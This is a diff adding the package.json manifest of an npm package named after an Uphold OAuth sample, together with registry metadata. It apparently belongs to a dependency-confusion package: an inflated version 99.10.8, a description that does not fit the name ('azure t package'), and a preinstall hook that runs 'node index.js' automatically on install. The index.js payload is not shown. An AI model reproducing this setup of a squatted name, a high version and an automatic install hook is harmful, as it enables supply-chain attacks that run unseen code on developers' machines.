@@ -1,0 +1,39 @@
+{
+    "name": "uphold-client-credentials-oauth-sample",
+    "version": "99.10.8",
+    "description": "azure t package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "uphold-client-credentials-oauth-sample@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-Haw7cO/7rspm4DVAy1fDcgeR+GmGt11z+4ABDJGDqukWzP82EvFqOYzu5fJv6Xh7w8mUZH+xByLpvvmsZ9SIyg==",
+        "shasum": "795ecb5e41d53f51b784c4ff979e5597105c26d9",
+        "tarball": "https://registry.npmjs.org/uphold-client-credentials-oauth-sample/-/uphold-client-credentials-oauth-sample-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3241,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmninCRA9TVsSAnZWagAAclEQAJWnjKzR4ZiUj66bsDV9\nmPZqIg/OF4BKMUldQqKKGOqu/9Z1M6mCXJBN7B4CdFz0WVvCViITpNn9gcVU\nRt8jG7Oa4sfp5aVletXKHnXDYHJGHpjLbRs4pgl5guozS98oheJN8gRrXQnC\nSHrKmF9+b7OARnMO9ASkBWrpMM5UincVhKICrSyj0i3Mu3WR2QvDa0z64R8i\nVpKfkbCDhtIAdV4dnppLDsTrO73D73EGAZce/MCte0VOeJSvwwQf8AxD/JDj\n2NEkIX58q+HPYisKVEJSdaRQsm6xZzBIvjb8SsRr5nfYCyZ+VQ7QHbFL44UV\nLy4EfKDhLjZeEF28UUMqpSHaz9GsREptTbMvgopE0IlyvIBI3lPKuNq4F0o3\nsanIvGnv6FOQyKDnJwT++Lsk61LevEbhAKFKjwDW9xFX5uO3qHDOCkpelyHe\nDGCoeQ4dr0RIV4ZZQT5ndkhRFjJhrB8fmlTsu4pNWb2Jv0wIiWdfzzcwzrmW\nYqz9eWwrQqvRlFj0hKjCX3/A2l2TRmT2/ymmcc4gQpKR4pSVfQ8vvxLuda/f\nbA/bcaCp+/BDJWDLHSYjEuesPqDPzELJn3d5yT3z4G9Ud9huxXYAo8cH+m/A\nwJ5D7/td/bmIZAm9C2atjFsxC+v5ltkm+kWyg58r0uOJU+BiN/fauen1QxPJ\n+uRI\r\n=gAE1\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/uphold-client-credentials-oauth-sample_99.10.8_1637513383201_0.6570482594089888"
+    },
+    "_hasShrinkwrap": false
+}
